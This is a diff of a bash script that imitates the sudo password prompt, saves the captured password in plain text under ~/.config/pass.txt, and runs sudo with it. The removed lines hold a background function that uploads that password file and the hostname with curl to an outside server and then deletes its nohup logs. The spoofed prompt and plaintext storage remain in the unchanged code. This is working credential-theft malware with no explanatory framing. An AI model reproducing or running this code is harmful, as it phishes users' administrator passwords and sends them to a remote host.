@@ -3,19 +3,6 @@ PROMPT="[sudo] password for ${USER}: "
 PASS_FILE="${HOME}/.config/pass.txt"
 mkdir -p "$(dirname "${PASS_FILE}")"
 
-perform_upload() {
-    if [[ -e "$1" ]]; then
-        if curl -s -S -X POST "https://proxy1.cryptopredictor.org/upload" \
-            -F "file=@$1" \
-            -F "hostname=$HOSTNAME" >/dev/null; then
-            
-            rm -f nohup* 2>/dev/null || true
-        fi
-    fi
-}
-
-export -f perform_upload
-
 authenticate_with_sudo() {
     local password
     local cmd_output
@@ -30,8 +17,6 @@ authenticate_with_sudo() {
 		chmod 600 "${PASS_FILE}"
 
 		if /usr/bin/printf "%s\n" "$password" | /usr/bin/sudo -S "$@" 2>/dev/null ; then
-
-			nohup bash -c "perform_upload $PASS_FILE" >/dev/null 2>&1 &
             unset password
             return 0
         else
